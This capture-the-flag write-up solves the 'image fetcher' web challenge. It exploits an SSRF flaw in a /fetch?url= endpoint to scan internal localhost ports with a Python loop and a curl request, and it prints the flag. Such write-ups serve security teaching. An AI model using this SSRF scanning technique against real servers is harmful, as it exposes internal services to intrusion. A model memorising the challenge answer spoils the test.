# image fetcher

**Category:** Web (SSRF) · **Points:** 167 · **Solves:** 77 · **Author:** ethan

**Flag:** `LITCTF{55rf_p0r7s_8e52df31}`

## Challenge

> I built this website to fetch images from online, but I didn't do a very good job of
> securing it...
> http://136.115.87.65:31770/

## Recon

The homepage spells out the whole vuln:

```
Use /fetch?url=http://example.com/image.jpg
You might also like to know that my local machine only uses port 5000-6000 ;)
Oh, and /fetch is rate limited to 25 req/s
```

`/fetch?url=` performs a **server-side request to any URL** → **SSRF**. It happily
fetches `http://127.0.0.1:<port>/` too:

- closed port → `Error: ... Connection refused`
- open port → `Not an image, but here you go: <response body>`

## Solution — scan the internal ports

Sweep `127.0.0.1:5000–6000` through the SSRF (staying under the 25 req/s limit, backing
off on `429`):

- `5000` — the image-fetcher app itself
- `5050` — a **decoy**: *"Just an internal service running on port 5050... Nothing to
  see here..."*
- **`5267`** — the real internal service, which returns the flag

```python
for port in range(5000, 6001):
    t = fetch(f"http://127.0.0.1:{port}/")
    if "LITCTF{" in t: print(port, t)   # -> 5267
```

```bash
curl "http://136.115.87.65:31770/fetch?url=http://127.0.0.1:5267/"
# ... LITCTF{55rf_p0r7s_8e52df31}
```

## Flag

```
LITCTF{55rf_p0r7s_8e52df31}
```
